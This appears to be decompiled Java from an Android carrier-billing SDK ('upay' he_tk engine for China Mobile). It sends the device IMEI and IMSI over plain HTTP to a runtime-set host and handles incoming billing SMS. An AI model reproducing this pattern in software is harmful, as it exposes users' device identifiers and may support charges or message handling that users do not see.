package com.upay.billing.engine.he_tk;

import android.annotation.SuppressLint;
import android.util.Log;
import com.upay.billing.MtContext;
import com.upay.billing.UpayContext;
import com.upay.billing.UpayCore;
import com.upay.billing.bean.Cmd;
import com.upay.billing.bean.Op;
import com.upay.billing.bean.Trade;
import com.upay.billing.engine.CommonEngine;
import com.upay.billing.utils.Json;
import com.upay.billing.utils.Util;
import java.util.ArrayList;
import java.util.List;

public class Main
  extends CommonEngine
{
  private static final String TAG = "he_tk-Main";
  private String Url_init = "http://$ip/normandie/first?cpparam=$cpparam&imei=$imei&imsi=$imsi&ctid=$ctid&cpid=$cpid";
  private String Url_pay = "http://$ip/normandie/last?flag=$flag&id=$id";
  private List<String> confirmFail;
  private int count = 0;
  private String dst_init;
  private String dst_pay;
  private String id;
  private List<String> regFail;
  private List<String> regSmsFail;
  private List<String> reqFail;
  private int retry = 2;
  private List<String> sendFail;
  private List<String> sendSucc;
  
  public Main() {}
  
  private void init_req(String paramString1, String paramString2, String paramString3, String paramString4, String paramString5, int paramInt1, Trade paramTrade, Cmd paramCmd, Json paramJson1, Json paramJson2, int paramInt2)
  {
    new Main.2(this, this.Url_init.replace("$ip", paramString1).replace("$cpparam", Util.shortenSn(paramString2, true)).replace("$imei", Util.ifEmpty(this.core.getUpayContext().imei, "")).replace("$imsi", Util.ifEmpty(this.core.getUpayContext().imsi, "")).replace("$ctid", paramString3).replace("$cpid", paramString4), paramString1, paramString5, paramString3, paramInt1, paramTrade, paramCmd, paramJson1, paramJson2, paramString2, paramString4, paramInt2).run();
  }
  
  private void pay_req(String paramString1, String paramString2, String paramString3, String paramString4, int paramInt1, Trade paramTrade, Cmd paramCmd, Json paramJson1, Json paramJson2, String paramString5, String paramString6, int paramInt2)
  {
    Util.addTask(new Main.3(this, paramString1, paramString2, paramString3, paramInt2, paramString4, paramInt1, paramTrade, paramJson1, paramCmd, paramString5, paramJson2, paramString6));
  }
  
  public Op getOp()
  {
    return Op.CMCC;
  }
  
  public boolean hasCustomConfirmUi()
  {
    return false;
  }
  
  public boolean isAvailable(Op paramOp, boolean paramBoolean1, boolean paramBoolean2, boolean paramBoolean3, boolean paramBoolean4)
  {
    return (paramOp == Op.CMCC) && (paramBoolean1) && (paramBoolean2);
  }
  
  public boolean isComposable()
  {
    return true;
  }
  
  @SuppressLint({"DefaultLocale"})
  public int onMtAction(MtContext paramMtContext, Json paramJson, String paramString1, String paramString2, String[] paramArrayOfString)
  {
    Log.i("he_tk-Main", "onMtAction: exec=" + paramJson.asObject() + ",mtNum=" + paramString1 + ",mtMsg=" + paramString2);
    switch (Main.4.$SwitchMap$com$upay$billing$engine$he_tk$Main$ExecType[Main.ExecType.valueOf(paramJson.getStr("type").toUpperCase()).ordinal()])
    {
    default: 
      return 0;
    case 1: 
      return 524288;
    case 2: 
      return 65736;
    }
    return 0x10000 | paramJson.getInt("code");
  }
  
  public void pay(Trade paramTrade, List<Cmd> paramList)
  {
    this.regFail = new ArrayList();
    this.sendSucc = new ArrayList();
    this.sendFail = new ArrayList();
    this.confirmFail = new ArrayList();
    this.reqFail = new ArrayList();
    this.regSmsFail = new ArrayList();
    Util.addTask(new Main.1(this, paramTrade, paramList));
  }
}
